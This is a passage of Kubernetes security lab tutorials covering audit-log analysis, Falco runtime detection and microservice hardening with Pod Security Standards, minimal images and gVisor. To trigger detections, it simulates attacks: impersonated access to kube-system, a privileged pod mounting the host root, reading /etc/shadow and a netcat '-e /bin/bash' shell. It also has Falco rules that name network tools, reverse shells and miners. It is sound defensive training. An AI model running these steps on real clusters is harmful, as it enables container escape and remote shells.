# Attempt 3: Try to access kube-system namespace
echo "Attempting to list pods in kube-system..."
kubectl get pods -n kube-system --as=system:serviceaccount:security-test:test-user

# Attempt 4: Try to modify existing resources
echo "Attempting to patch deployment..."
kubectl patch deployment coredns -n kube-system -p '{"spec":{"replicas":1}}' --as=system:serviceaccount:security-test:test-user

# Generate some legitimate activity for comparison
echo "Generating legitimate activity..."
kubectl get pods -n security-test --as=system:serviceaccount:security-test:test-user
kubectl describe pod privilege-escalation-test -n security-test --as=system:serviceaccount:security-test:test-user

Subtask 2.4: Analyze Audit Logs

# Wait a moment for logs to be written
sleep 30

# Check recent audit log entries
echo "=== Recent Audit Log Entries ==="
sudo tail -20 /var/log/kubernetes/audit/audit.log | jq '.'

# Look for failed authorization attempts
echo "=== Failed Authorization Attempts ==="
sudo grep -i "forbidden\|unauthorized" /var/log/kubernetes/audit/audit.log | tail -10 | jq '.'

# Look for privilege escalation attempts
echo "=== Privilege Escalation Attempts ==="
sudo grep -i "clusterrole\|secrets" /var/log/kubernetes/audit/audit.log | tail -5 | jq '.'

# Analyze user activities
echo "=== Activities by test-user ==="
sudo grep "system:serviceaccount:security-test:test-user" /var/log/kubernetes/audit/audit.log | tail -10 | jq '.user.username, .verb, .objectRef.resource, .responseStatus.code'

Subtask 2.5: Create Log Analysis Script

# Create a script to analyze suspicious activities
cat > analyze_audit_logs.sh << 'EOF'
#!/bin/bash

AUDIT_LOG="/var/log/kubernetes/audit/audit.log"

echo "=== Kubernetes Audit Log Analysis ==="
echo "Analyzing log file: $AUDIT_LOG"
echo

# Check if audit log exists
if [ ! -f "$AUDIT_LOG" ]; then
    echo "Audit log file not found!"
    exit 1
fi

echo "1. Failed Authentication/Authorization Attempts:"
echo "================================================"
sudo grep -i "forbidden\|unauthorized\|authentication failed" "$AUDIT_LOG" | \
    jq -r '"\(.timestamp) - User: \(.user.username // "unknown") - Action: \(.verb) \(.objectRef.resource // .requestURI) - Status: \(.responseStatus.code)"' | \
    tail -10

echo
echo "2. Privilege Escalation Indicators:"
echo "=================================="
sudo grep -E "(clusterrole|clusterrolebinding|secrets|serviceaccounts/token)" "$AUDIT_LOG" | \
    jq -r '"\(.timestamp) - User: \(.user.username // "unknown") - Action: \(.verb) \(.objectRef.resource) - Status: \(.responseStatus.code)"' | \
    tail -10

echo
echo "3. Suspicious Resource Access:"
echo "============================="
sudo grep -E "(kube-system|kube-public)" "$AUDIT_LOG" | \
    jq -r '"\(.timestamp) - User: \(.user.username // "unknown") - Namespace: \(.objectRef.namespace) - Action: \(.verb) \(.objectRef.resource)"' | \
    tail -10

echo
echo "4. Summary Statistics:"
echo "===================="
echo "Total audit entries: $(sudo wc -l < "$AUDIT_LOG")"
echo "Failed requests: $(sudo grep -c '"code":403\|"code":401' "$AUDIT_LOG")"
echo "Successful requests: $(sudo grep -c '"code":200\|"code":201' "$AUDIT_LOG")"

EOF

chmod +x analyze_audit_logs.sh
./analyze_audit_logs.sh

Task 3: Use Falco to Detect Runtime Anomalies
Subtask 3.1: Install Falco

# Add Falco repository
curl -s https://falco.org/repo/falcosecurity-packages.asc | sudo apt-key add -
echo "deb https://download.falco.org/packages/deb stable main" | sudo tee -a /etc/apt/sources.list.d/falcosecurity.list

# Update package list and install Falco
sudo apt-get update -y
sudo apt-get install -y falco

# Check Falco version
falco --version

Subtask 3.2: Configure Falco for Kubernetes

# Create Falco configuration for Kubernetes
sudo tee /etc/falco/falco_rules.local.yaml > /dev/null <<EOF
# Custom rules for Kubernetes security monitoring

- rule: Detect Privilege Escalation
  desc: Detect attempts to escalate privileges
  condition: >
    k8s_audit and
    ka.verb in (create, update, patch) and
    ka.target.resource in (clusterroles, clusterrolebindings, roles, rolebindings) and
    ka.response_code >= 200 and ka.response_code < 300
  output: >
    Privilege escalation detected (user=%ka.user.name verb=%ka.verb 
    resource=%ka.target.resource reason=%ka.response_reason)
  priority: WARNING
  tags: [k8s, rbac, privilege_escalation]

- rule: Detect Secret Access
  desc: Detect unauthorized access to secrets
  condition: >
    k8s_audit and
    ka.verb in (get, list, watch) and
    ka.target.resource=secrets and
    ka.response_code >= 200 and ka.response_code < 300
  output: >
    Secret access detected (user=%ka.user.name verb=%ka.verb 
    secret=%ka.target.name namespace=%ka.target.namespace)
  priority: WARNING
  tags: [k8s, secrets]

- rule: Detect Suspicious Container Activity
  desc: Detect suspicious activities in containers
  condition: >
    spawned_process and
    container and
    proc.name in (nc, netcat, ncat, nmap, dig, nslookup, tcpdump)
  output: >
    Suspicious network tool executed in container (user=%user.name 
    command=%proc.cmdline container=%container.name image=%container.image.repository)
  priority: WARNING
  tags: [container, network, suspicious]

- rule: Detect File System Changes in Containers
  desc: Detect unauthorized file system modifications
  condition: >
    open_write and
    container and
    fd.typechar='f' and
    fd.name startswith /etc
  output: >
    File modification in sensitive directory (user=%user.name 
    file=%fd.name container=%container.name command=%proc.cmdline)
  priority: WARNING
  tags: [filesystem, container]
EOF

Subtask 3.3: Deploy Falco in Kubernetes

# Create Falco namespace
kubectl create namespace falco

# Deploy Falco using Helm (install Helm first if not available)
curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash

# Add Falco Helm repository
helm repo add falcosecurity https://falcosecurity.github.io/charts
helm repo update

# Install Falco
helm install falco falcosecurity/falco \
  --namespace falco \
  --set falco.grpc.enabled=true \
  --set falco.grpcOutput.enabled=true \
  --set auditLog.enabled=true \
  --set auditLog.dynamicBackend.enabled=true

# Wait for Falco to be ready
kubectl wait --for=condition=ready pod -l app.kubernetes.io/name=falco -n falco --timeout=300s

Subtask 3.4: Alternative Falco Deployment (if Helm fails)

# If Helm installation fails, deploy Falco manually
kubectl apply -f - <<EOF
apiVersion: v1
kind: ServiceAccount
metadata:
  name: falco
  namespace: falco
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: falco
rules:
- apiGroups: [""]
  resources: ["nodes", "namespaces", "pods", "replicationcontrollers", "services", "events"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["apps"]
  resources: ["daemonsets", "deployments", "replicasets", "statefulsets"]
  verbs: ["get", "list", "watch"]
- apiGroups: ["extensions"]
  resources: ["daemonsets", "deployments", "replicasets"]
  verbs: ["get", "list", "watch"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: falco
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: falco
subjects:
- kind: ServiceAccount
  name: falco
  namespace: falco
---
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: falco
  namespace: falco
spec:
  selector:
    matchLabels:
      app: falco
  template:
    metadata:
      labels:
        app: falco
    spec:
      serviceAccount: falco
      hostNetwork: true
      hostPID: true
      containers:
      - name: falco
        image: falcosecurity/falco:0.36.2
        securityContext:
          privileged: true
        args:
          - /usr/bin/falco
          - --cri=/run/containerd/containerd.sock
          - --k8s-api
          - --k8s-api-cert=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
          - --k8s-api-token=/var/run/secrets/kubernetes.io/serviceaccount/token
        volumeMounts:
        - mountPath: /host/var/run/docker.sock
          name: docker-socket
        - mountPath: /host/run/containerd/containerd.sock
          name: containerd-socket
        - mountPath: /host/dev
          name: dev-fs
        - mountPath: /host/proc
          name: proc-fs
          readOnly: true
        - mountPath: /host/boot
          name: boot-fs
          readOnly: true
        - mountPath: /host/lib/modules
          name: lib-modules
          readOnly: true
        - mountPath: /host/usr
          name: usr-fs
          readOnly: true
        - mountPath: /host/etc
          name: etc-fs
          readOnly: true
      volumes:
      - name: docker-socket
        hostPath:
          path: /var/run/docker.sock
      - name: containerd-socket
        hostPath:
          path: /run/containerd/containerd.sock
      - name: dev-fs
        hostPath:
          path: /dev
      - name: proc-fs
        hostPath:
          path: /proc
      - name: boot-fs
        hostPath:
          path: /boot
      - name: lib-modules
        hostPath:
          path: /lib/modules
      - name: usr-fs
        hostPath:
          path: /usr
      - name: etc-fs
        hostPath:
          path: /etc
      tolerations:
      - effect: NoSchedule
        key: node-role.kubernetes.io/master
EOF

Subtask 3.5: Verify Falco Installation

# Check Falco pods
kubectl get pods -n falco

# Check Falco logs
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=20

# If using manual deployment
kubectl logs -n falco -l app=falco --tail=20

Subtask 3.6: Generate Runtime Anomalies for Detection

# Create a pod that will perform suspicious activities
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: suspicious-pod
  namespace: security-test
spec:
  containers:
  - name: suspicious-container
    image: ubuntu:20.04
    command: ["/bin/bash"]
    args: ["-c", "apt-get update && apt-get install -y netcat-openbsd && sleep 3600"]
    securityContext:
      runAsUser: 0
      privileged: true
EOF

# Wait for the pod to be ready
kubectl wait --for=condition=ready pod/suspicious-pod -n security-test --timeout=300s

# Execute suspicious commands in the container
echo "Executing suspicious network commands..."
kubectl exec -it suspicious-pod -n security-test -- /bin/bash -c "
echo 'Testing network connectivity...'
nc -l -p 8080 &
sleep 2
pkill nc
echo 'Network test completed'
"

# Try to modify system files
echo "Attempting to modify system files..."
kubectl exec suspicious-pod -n security-test -- /bin/bash -c "
echo 'test' > /etc/test-file 2>/dev/null || echo 'Failed to write to /etc'
"

# Access sensitive directories
echo "Accessing sensitive directories..."
kubectl exec suspicious-pod -n security-test -- /bin/bash -c "
ls -la /etc/passwd /etc/shadow 2>/dev/null || echo 'Cannot access sensitive files'
"

Subtask 3.7: Monitor Falco Alerts

# Monitor Falco alerts in real-time
echo "Monitoring Falco alerts (press Ctrl+C to stop)..."
kubectl logs -n falco -l app.kubernetes.io/name=falco -f &
FALCO_PID=$!

# If using manual deployment
kubectl logs -n falco -l app=falco -f &
FALCO_MANUAL_PID=$!

# Wait for a few seconds to capture alerts
sleep 30

# Stop monitoring
kill $FALCO_PID 2>/dev/null
kill $FALCO_MANUAL_PID 2>/dev/null

echo "Falco monitoring stopped."

Subtask 3.8: Analyze Falco Alerts

# Get recent Falco alerts
echo "=== Recent Falco Alerts ==="
kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=50 | grep -E "(WARNING|ERROR|CRITICAL)" || \
kubectl logs -n falco -l app=falco --tail=50 | grep -E "(WARNING|ERROR|CRITICAL)"

# Create a script to parse Falco alerts
cat > parse_falco_alerts.sh << 'EOF'
#!/bin/bash

echo "=== Falco Alert Analysis ==="
echo

# Get Falco logs
FALCO_LOGS=$(kubectl logs -n falco -l app.kubernetes.io/name=falco --tail=100 2>/dev/null || \
             kubectl logs -n falco -l app=falco --tail=100 2>/dev/null)

if [ -z "$FALCO_LOGS" ]; then
    echo "No Falco logs found. Falco might not be running properly."
    exit 1
fi

echo "1. Security Alerts Summary:"
echo "=========================="
echo "$FALCO_LOGS" | grep -c "WARNING" | xargs echo "WARNING alerts:"
echo "$FALCO_LOGS" | grep -c "ERROR" | xargs echo "ERROR alerts:"
echo "$FALCO_LOGS" | grep -c "CRITICAL" | xargs echo "CRITICAL alerts:"

echo
echo "2. Recent Security Events:"
echo "========================="
echo "$FALCO_LOGS" | grep -E "(WARNING|ERROR|CRITICAL)" | tail -10

echo
echo "3. Container-related Alerts:"
echo "==========================="
echo "$FALCO_LOGS" | grep -i "container" | tail -5

echo
echo "4. Network-related Alerts:"
echo "========================="
echo "$FALCO_LOGS" | grep -i "network\|netcat\|nc" | tail -5

EOF

chmod +x parse_falco_alerts.sh
./parse_falco_alerts.sh

Task 4: Advanced Threat Detection and Response
Subtask 4.1: Create Custom Falco Rules

# Create advanced custom rules
kubectl create configmap falco-custom-rules -n falco --from-literal=custom_rules.yaml="
- rule: Detect Cryptocurrency Mining
  desc: Detect potential cryptocurrency mining activities
  condition: >
    spawned_process and
    container and
    proc.name in (xmrig, cpuminer, cgminer, bfgminer, ethminer)
  output: >
    Cryptocurrency mining detected (user=%user.name command=%proc.cmdline 
    container=%container.name image=%container.image.repository)
  priority: CRITICAL
  tags: [malware, cryptocurrency, mining]

- rule: Detect Reverse Shell
  desc: Detect potential reverse shell connections
  condition: >
    spawned_process and
    container and
    ((proc.name=nc and proc.args contains \"-e\") or
     (proc.name=bash and proc.pname=nc) or
     (proc.name=sh and proc.pname=nc))
  output: >
    Potential reverse shell detected (user=%user.name command=%proc.cmdline 
    container=%container.name)
  priority: CRITICAL
  tags: [attack, reverse_shell]

- rule: Detect Container Escape Attempt
  desc: Detect attempts to escape from containers
  condition: >
    open_write and
    container and
    fd.name startswith /host
  output: >
    Container escape attempt detected (user=%user.name file=%fd.name 
    container=%container.name command=%proc.cmdline)
  priority: CRITICAL
  tags: [container_escape, privilege_escalation]
"

Subtask 4.2: Test Advanced Detection

# Create a more sophisticated attack simulation
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: advanced-threat-test
  namespace: security-test
spec:
  containers:
  - name: threat-container
    image: ubuntu:20.04
    command: ["/bin/bash"]
    args: ["-c", "sleep 3600"]
    securityContext:
      runAsUser: 0
    volumeMounts:
    - name: host-root
      mountPath: /host
      readOnly: false
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# Wait for pod to be ready
kubectl wait --for=condition=ready pod/advanced-threat-test -n security-test --timeout=300s

# Simulate container escape attempt
echo "Simulating container escape attempt..."
kubectl exec advanced-threat-test -n security-test -- /bin/bash -c "
echo 'Attempting to access host filesystem...'
ls /host/etc/ 2>/dev/null || echo 'Host access failed'
echo 'test' > /host/tmp/container-escape-test 2>/dev/null || echo 'Write to host failed'
"

# Simulate reverse shell attempt
echo "Simulating reverse shell attempt..."
kubectl exec advanced-threat-test -n security-test -- /bin/bash -c "
echo 'Simulating reverse shell...'
nc -l -p 4444 -e /bin/bash &
sleep 2
pkill nc
echo 'Reverse shell simulation completed'
" 2>/dev/null || echo






Lab 16: Minimizing Microservice Vulnerabilities
Objectives

By the end of this lab, you will be able to:

• Deploy applications with the Baseline Pod Security Standard to enforce security policies • Reduce container image attack surface by using minimal base images • Implement application sandboxing using gVisor runtime for enhanced isolation • Understand the security benefits of each approach in microservice architectures • Apply security best practices for container and Kubernetes deployments
Prerequisites

Before starting this lab, you should have:

• Basic understanding of Kubernetes concepts (pods, deployments, services) • Familiarity with Docker containers and container images • Knowledge of YAML configuration files • Understanding of Linux command line operations • Basic security concepts related to containers
Lab Environment

Al Nafi provides you with a pre-configured Linux-based cloud machine with all necessary tools installed. Simply click Start Lab to begin - no need to build your own VM or install additional software.

Your lab environment includes: • Kubernetes cluster (v1.28+) • Docker runtime • kubectl command-line tool • gVisor runtime (runsc) • Text editors (nano, vim)
Task 1: Deploy Applications with Baseline Pod Security Standard
Subtask 1.1: Understanding Pod Security Standards

Pod Security Standards define three different policies to broadly cover the security spectrum:

• Privileged: Unrestricted policy, providing the widest possible level of permissions • Baseline: Minimally restrictive policy which prevents known privilege escalations • Restricted: Heavily restricted policy, following current Pod hardening best practices
Subtask 1.2: Enable Pod Security Standards

First, let's check the current Kubernetes version and create a namespace with Pod Security Standards enabled.

# Check Kubernetes version
kubectl version --short

# Create a namespace with Baseline Pod Security Standard
kubectl create namespace secure-microservices

# Label the namespace to enforce Baseline Pod Security Standard
kubectl label namespace secure-microservices \
  pod-security.kubernetes.io/enforce=baseline \
  pod-security.kubernetes.io/audit=baseline \
  pod-security.kubernetes.io/warn=baseline

Subtask 1.3: Create a Non-Compliant Application

Let's first create an application that violates the Baseline Pod Security Standard to understand what gets blocked.

# Create a non-compliant deployment
cat << 'EOF' > non-compliant-app.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: non-compliant-app
  namespace: secure-microservices
spec:
  replicas: 1
  selector:
    matchLabels:
      app: non-compliant-app
  template:
    metadata:
      labels:
        app: non-compliant-app
    spec:
      containers:
      - name: app
        image: nginx:latest
        securityContext:
          privileged: true  # This violates Baseline standard
          runAsUser: 0      # Running as root
        ports:
        - containerPort: 80
EOF

# Try to apply the non-compliant deployment
kubectl apply -f non-compliant-app.yaml

You should see warnings or errors about policy violations.
Subtask 1.4: Create a Compliant Application

Now let's create a compliant application that follows the Baseline Pod Security Standard.

# Create a compliant deployment
cat << 'EOF' > compliant-app.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: compliant-app
  namespace: secure-microservices
spec:
  replicas: 2
  selector:
    matchLabels:
      app: compliant-app
  template:
    metadata:
      labels:
        app: compliant-app
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        runAsGroup: 1000
        fsGroup: 1000
      containers:
      - name: app
        image: nginx:latest
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          runAsUser: 1000
          capabilities:
            drop:
            - ALL
        ports:
        - containerPort: 8080
        volumeMounts:
        - name: tmp-volume
          mountPath: /tmp
        - name: var-cache-nginx
          mountPath: /var/cache/nginx
        - name: var-run
          mountPath: /var/run
      volumes:
      - name: tmp-volume
        emptyDir: {}
      - name: var-cache-nginx
        emptyDir: {}
      - name: var-run
        emptyDir: {}
---
apiVersion: v1
kind: Service
metadata:
  name: compliant-app-service
  namespace: secure-microservices
spec:
  selector:
    app: compliant-app
  ports:
  - port: 80
    targetPort: 8080
  type: ClusterIP
EOF

# Apply the compliant deployment
kubectl apply -f compliant-app.yaml

# Check the deployment status
kubectl get pods -n secure-microservices
kubectl describe deployment compliant-app -n secure-microservices

Subtask 1.5: Verify Pod Security Compliance

# Check pod security context
kubectl get pod -n secure-microservices -l app=compliant-app -o yaml | grep -A 10 securityContext

# Verify the pods are running with correct user
kubectl exec -n secure-microservices deployment/compliant-app -- id

# Check for any security violations in events
kubectl get events -n secure-microservices --sort-by='.lastTimestamp'

Task 2: Reduce Image Size by Using Minimal Base Images
Subtask 2.1: Analyze Current Image Size

Let's start by examining the size of a standard base image and then optimize it.

# Pull and examine a standard Ubuntu image
docker pull ubuntu:latest
docker images ubuntu:latest

# Pull and examine Alpine Linux (minimal base image)
docker pull alpine:latest
docker images alpine:latest

# Compare sizes
docker images | grep -E "(ubuntu|alpine)"

Subtask 2.2: Create Application with Standard Base Image

First, let's create a simple web application using a standard base image.

# Create a directory for our application
mkdir -p ~/microservice-app
cd ~/microservice-app

# Create a simple Python web application
cat << 'EOF' > app.py
from flask import Flask, jsonify
import os

app = Flask(__name__)

@app.route('/')
def hello():
    return jsonify({
        'message': 'Hello from secure microservice!',
        'hostname': os.environ.get('HOSTNAME', 'unknown'),
        'version': '1.0'
    })

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
EOF

# Create requirements file
cat << 'EOF' > requirements.txt
Flask==2.3.3
Werkzeug==2.3.7
EOF

# Create Dockerfile with standard base image
cat << 'EOF' > Dockerfile.standard
FROM python:3.11
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .
EXPOSE 8080
CMD ["python", "app.py"]
EOF

# Build the standard image
docker build -f Dockerfile.standard -t microservice-app:standard .

# Check the image size
docker images microservice-app:standard

Subtask 2.3: Create Optimized Application with Minimal Base Image

Now let's create the same application using a minimal base image.

# Create optimized Dockerfile using Alpine
cat << 'EOF' > Dockerfile.alpine
FROM python:3.11-alpine
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .
RUN addgroup -g 1000 appgroup && \
    adduser -D -u 1000 -G appgroup appuser && \
    chown -R appuser:appgroup /app
USER appuser
EXPOSE 8080
CMD ["python", "app.py"]
EOF

# Build the Alpine-based image
docker build -f Dockerfile.alpine -t microservice-app:alpine .

# Create an even more minimal distroless image
cat << 'EOF' > Dockerfile.distroless
FROM python:3.11-alpine as builder
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt --target /app/packages

FROM gcr.io/distroless/python3
COPY --from=builder /app/packages /app/packages
COPY app.py /app/
WORKDIR /app
ENV PYTHONPATH=/app/packages
EXPOSE 8080
CMD ["app.py"]
EOF

# Build the distroless image
docker build -f Dockerfile.distroless -t microservice-app:distroless .

# Compare all image sizes
echo "Image Size Comparison:"
docker images | grep microservice-app

Subtask 2.4: Deploy Minimal Image Application

# Create deployment using the minimal Alpine image
cat << 'EOF' > minimal-app-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: minimal-app
  namespace: secure-microservices
spec:
  replicas: 2
  selector:
    matchLabels:
      app: minimal-app
  template:
    metadata:
      labels:
        app: minimal-app
    spec:
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        runAsGroup: 1000
        fsGroup: 1000
      containers:
      - name: app
        image: microservice-app:alpine
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          runAsUser: 1000
          capabilities:
            drop:
            - ALL
        ports:
        - containerPort: 8080
        resources:
          requests:
            memory: "64Mi"
            cpu: "50m"
          limits:
            memory: "128Mi"
            cpu: "100m"
        livenessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 30
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 5
          periodSeconds: 5
        volumeMounts:
        - name: tmp-volume
          mountPath: /tmp
      volumes:
      - name: tmp-volume
        emptyDir: {}
---
apiVersion: v1
kind: Service
metadata:
  name: minimal-app-service
  namespace: secure-microservices
spec:
  selector:
    app: minimal-app
  ports:
  - port: 80
    targetPort: 8080
  type: ClusterIP
EOF

# Deploy the minimal application
kubectl apply -f minimal-app-deployment.yaml

# Verify deployment
kubectl get pods -n secure-microservices -l app=minimal-app
kubectl logs -n secure-microservices deployment/minimal-app

Subtask 2.5: Test Application Functionality

# Test the application
kubectl port-forward -n secure-microservices service/minimal-app-service 8080:80 &
sleep 5

# Test the endpoints
curl http://localhost:8080/
curl http://localhost:8080/health

# Stop port forwarding
pkill -f "kubectl port-forward"

Task 3: Test Application Sandboxing Using gVisor
Subtask 3.1: Verify gVisor Installation

gVisor provides an additional layer of isolation by implementing a user-space kernel.

# Check if gVisor (runsc) is available
which runsc
runsc --version

# Check available container runtimes
kubectl get nodes -o wide

# Verify gVisor runtime class exists
kubectl get runtimeclass

Subtask 3.2: Create gVisor Runtime Class

If gVisor runtime class doesn't exist, let's create it.

# Create gVisor runtime class
cat << 'EOF' > gvisor-runtime-class.yaml
apiVersion: node.k8s.io/v1
kind: RuntimeClass
metadata:
  name: gvisor
handler: runsc
EOF

# Apply the runtime class
kubectl apply -f gvisor-runtime-class.yaml

# Verify runtime class creation
kubectl get runtimeclass gvisor -o yaml

Subtask 3.3: Deploy Application with gVisor Sandboxing

# Create a sandboxed application deployment
cat << 'EOF' > sandboxed-app-deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: sandboxed-app
  namespace: secure-microservices
spec:
  replicas: 2
  selector:
    matchLabels:
      app: sandboxed-app
  template:
    metadata:
      labels:
        app: sandboxed-app
    spec:
      runtimeClassName: gvisor  # Use gVisor runtime
      securityContext:
        runAsNonRoot: true
        runAsUser: 1000
        runAsGroup: 1000
        fsGroup: 1000
      containers:
      - name: app
        image: microservice-app:alpine
        securityContext:
          allowPrivilegeEscalation: false
          readOnlyRootFilesystem: true
          runAsNonRoot: true
          runAsUser: 1000
          capabilities:
            drop:
            - ALL
        ports:
        - containerPort: 8080
        resources:
          requests:
            memory: "128Mi"  # gVisor needs more memory
            cpu: "100m"
          limits:
            memory: "256Mi"
            cpu: "200m"
        livenessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 45  # Longer delay for gVisor startup
          periodSeconds: 10
        readinessProbe:
          httpGet:
            path: /health
            port: 8080
          initialDelaySeconds: 10
          periodSeconds: 5
        volumeMounts:
        - name: tmp-volume
          mountPath: /tmp
      volumes:
      - name: tmp-volume
        emptyDir: {}
---
apiVersion: v1
kind: Service
metadata:
  name: sandboxed-app-service
  namespace: secure-microservices
spec:
  selector:
    app: sandboxed-app
  ports:
  - port: 80
    targetPort: 8080
  type: ClusterIP
EOF

# Deploy the sandboxed application
kubectl apply -f sandboxed-app-deployment.yaml

# Monitor the deployment
kubectl get pods -n secure-microservices -l app=sandboxed-app -w

Subtask 3.4: Verify gVisor Sandboxing

# Check that pods are using gVisor runtime
kubectl get pods -n secure-microservices -l app=sandboxed-app -o yaml | grep -A 5 -B 5 runtimeClassName

# Get detailed pod information
kubectl describe pods -n secure-microservices -l app=sandboxed-app

# Check the container runtime being used
kubectl get pods -n secure-microservices -l app=sandboxed-app -o jsonpath='{.items[0].status.containerStatuses[0].containerID}'

Subtask 3.5: Test Sandboxed Application Security

# Test system call restrictions in gVisor
kubectl exec -n secure-microservices deployment/sandboxed-app -- cat /proc/version

# Compare with regular container
kubectl exec -n secure-microservices deployment/minimal-app -- cat /proc/version

# Test file system access
kubectl exec -n secure-microservices deployment/sandboxed-app -- ls -la /

# Test network functionality
kubectl port-forward -n secure-microservices service/sandboxed-app-service 8081:80 &
sleep 5

curl http://localhost:8081/
curl http://localhost:8081/health

# Stop port forwarding
pkill -f "kubectl port-forward"

Subtask 3.6: Performance and Security Comparison

# Create a test script to compare performance
cat << 'EOF' > performance-test.sh
#!/bin/bash

echo "Testing Regular Container Performance:"
kubectl exec -n secure-microservices deployment/minimal-app -- time python -c "
import time
start = time.time()
for i in range(1000):
    pass
print(f'Execution time: {time.time() - start:.4f} seconds')
"

echo -e "\nTesting gVisor Sandboxed Container Performance:"
kubectl exec -n secure-microservices deployment/sandboxed-app -- time python -c "
import time
start = time.time()
for i in range(1000):
    pass
print(f'Execution time: {time.time() - start:.4f} seconds')
"

echo -e "\nResource Usage Comparison:"
kubectl top pods -n secure-microservices
EOF

chmod +x performance-test.sh
./performance-test.sh

Task 4: Security Analysis and Verification
Subtask 4.1: Analyze Security Posture

# Check all deployments security configurations
kubectl get pods -n secure-microservices -o yaml | grep -A 10 -B 5 securityContext

# Verify Pod Security Standards compliance
kubectl get events -n secure-microservices --field-selector reason=FailedCreate

# Check resource usage and limits
kubectl describe pods -n secure-microservices | grep -A 5 -B 5 "Limits\|Requests"

Subtask 4.2: Network Security Testing

# Test network policies (create a basic network policy)
cat << 'EOF' > network-policy.yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: secure-microservices-policy
  namespace: secure-microservices
spec:
  podSelector: {}
  policyTypes:
  - Ingress
  - Egress
  ingress:
  - from:
    - namespaceSelector:
        matchLabels:
          name: secure-microservices
    ports:
    - protocol: TCP
      port: 8080
  egress:
  - to: []
    ports:
    - protocol: TCP
      port: 53
    - protocol: UDP
      port: 53
  - to: []
    ports:
    - protocol: TCP
      port: 443
EOF

kubectl apply -f network-policy.yaml

# Verify network policy
kubectl get networkpolicy -n secure-microservices
kubectl describe networkpolicy secure-microservices-policy -n secure-microservices

Subtask 4.3: Create Security Summary Report

# Generate a comprehensive security report
cat << 'EOF' > generate-security-report.sh
#!/bin/bash

echo "=== MICROSERVICE SECURITY REPORT ==="
echo "Generated on: $(date)"
echo

echo "1. NAMESPACE SECURITY CONFIGURATION:"
kubectl get namespace secure-microservices --show-labels
echo

echo "2. POD SECURITY STANDARDS:"
kubectl get pods -n secure-microservices -o custom-columns="NAME:.metadata.name,RUNTIME:.spec.runtimeClassName,USER:.spec.securityContext.runAsUser,NON-ROOT:.spec.securityContext.runAsNonRoot"
echo

echo "3. IMAGE SIZES:"
docker images | grep microservice-app
echo

echo "4. RESOURCE USAGE:"
kubectl top pods -n secure-microservices 2>/dev/null || echo "Metrics server not available"
echo

echo "5. SECURITY CONTEXTS:"
kubectl get pods -n secure-microservices -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.spec.containers[0].securityContext}{"\n"}{end}'
echo

echo "6. NETWORK POLICIES:"
kubectl get networkpolicy -n secure-microservices
echo

echo "=== END OF REPORT ==="
EOF

chmod +x generate-security-report.sh
./generate-security-report.sh > security-report.txt
cat security-report.txt

Troubleshooting Common Issues
Issue 1: Pod Security Standard Violations

If pods fail to start due to security policy violations:

# Check events for security violations
kubectl get events -n secure-microservices --sort-by='.lastTimestamp'

# Common fixes:
# - Ensure runAsNonRoot: true
# - Set appropriate runAsUser (non-zero)
# - Drop all capabilities
# - Set allowPrivilegeEscalation: false

Issue 2: gVisor Runtime Issues

If gVisor pods fail to start:

# Check if gVisor is properly installed
sudo runsc --version

# Check runtime class configuration
kubectl describe runtimeclass gvisor

# Verify node supports gVisor
kubectl describe node | grep -i runtime

Issue 3: Image Build Problems

If Docker builds fail:

# Check Docker daemon status
sudo systemctl status docker

# Clean up Docker cache
docker system prune -f

# Rebuild with verbose output
docker build --no-cache -f Dockerfile.alpine -t microservice-app:alpine .

Cleanup

# Remove all resources created in this lab
kubectl delete namespace secure-microservices
kubectl delete runtimeclass gvisor

# Remove Docker images
docker rmi microservice-app:standard microservice-app:alpine microservice-app:distroless

# Clean up files
cd ~
rm -rf microservice-app
rm -f *.yaml *.sh *.txt

Conclusion

In this lab, you have successfully implemented three critical security measures for microservices:

Pod Security Standards: You deployed applications using the Baseline Pod Security Standard, which provides essential security controls without being overly restrictive. This prevents common privilege escalation attacks and ensures containers run with appropriate security contexts.

Minimal Base Images: You reduced the attack surface by using Alpine Linux instead of full Ubuntu images, achieving significant size reduction (often 10x smaller). Smaller images mean fewer potential vulnerabilities, faster deployment times, and reduced storage costs.

gVisor Sandboxing: You implemented application sandboxing using gVisor, which provides an additional layer of isolation by running containers in a user-space kernel. This significantly reduces the risk of container escape attacks.

Key Security Benefits Achieved: • Reduced attack surface through minimal images • Enhanced isolation with gVisor sandboxing • Enforced security policies with Pod Security Standards • Implemented defense-in-depth security strategy • Maintained application functionality while improving security

